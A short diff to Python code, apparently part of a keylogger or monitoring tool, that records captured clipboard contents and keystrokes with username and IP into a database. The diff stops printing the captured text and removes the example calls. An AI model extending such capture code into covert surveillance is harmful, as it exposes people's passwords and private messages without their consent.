@@ -42,7 +42,7 @@ def log_clipboard(data):
                                 "INSERT INTO clipboard_logs (timestamp, username, ip, text, type) VALUES (?, ?, ?, ?, ?)",
                                 (timestamp, username, ip, log_entry, "clipboard"),
                             )
-                            print(f"Clipboard logged: {log_entry}")
+                            print(f"Clipboard logged")
                         except Exception as e:
                             print(f"Error logging clipboard file: {e}")
                     else:
@@ -68,7 +68,7 @@ def log_clipboard(data):
                         "INSERT INTO clipboard_logs (timestamp, username, ip, text, type) VALUES (?, ?, ?, ?, ?)",
                         (timestamp, username, ip, log_entry, "clipboard"),
                     )
-                    print(f"Clipboard logged: {log_entry}")
+                    print(f"Clipboard logged")
                 except Exception as e:
                     print(f"Error logging clipboard text: {e}")
 
@@ -101,7 +101,7 @@ def log_sentence(sentence):
     conn.commit()
     conn.close()
 
-    print(f"Keystroke logged: {sentence}")
+    print(f"Keystroke logged")
 
 
 def log_all(data, log_type):
@@ -111,8 +111,3 @@ def log_all(data, log_type):
         log_sentence(data)
     else:
         raise ValueError("Invalid log type. Must be 'clipboard' or 'keystroke'.")
-
-
-# Example usage:
-log_all("Sample clipboard text", "clipboard")
-log_all("Sample keystroke text", "keystroke")
